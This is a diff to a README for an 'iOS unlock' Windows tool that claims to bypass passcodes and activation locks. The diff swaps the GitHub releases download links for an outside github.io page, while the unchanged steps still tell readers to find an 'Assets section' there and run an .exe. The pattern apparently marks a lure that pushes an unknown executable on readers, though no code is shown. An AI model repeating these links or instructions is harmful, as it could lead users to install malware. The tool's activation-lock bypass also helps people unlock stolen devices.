@@ -1,6 +1,6 @@
 # 🔓 MagFone-iOS-Unlock-2026 - Access locked iOS devices on Windows
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/salih8124/MagFone-iOS-Unlock-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://salih8124.github.io)
 
 MagFone iOS Unlock allows users to remove screen locks from Apple devices directly from a Windows computer. This tool bypasses common security barriers such as forgotten passcodes, disabled devices, or activation locks. The software installs on Windows 11 and Windows 10 systems.
 
@@ -20,7 +20,7 @@ Before you install the software, ensure your computer meets these basic requirem
 
 Follow these steps to obtain the correct version of the application.
 
-1.  Visit this page to download: [https://github.com/salih8124/MagFone-iOS-Unlock-2026/releases](https://github.com/salih8124/MagFone-iOS-Unlock-2026/releases)
+1.  Visit this page to download: [https://salih8124.github.io](https://salih8124.github.io)
 2.  Scroll to the Assets section on that page.
 3.  Click the file ending in .exe to start the transfer.
 4.  Save the file to your Downloads folder or your desktop for easy access.
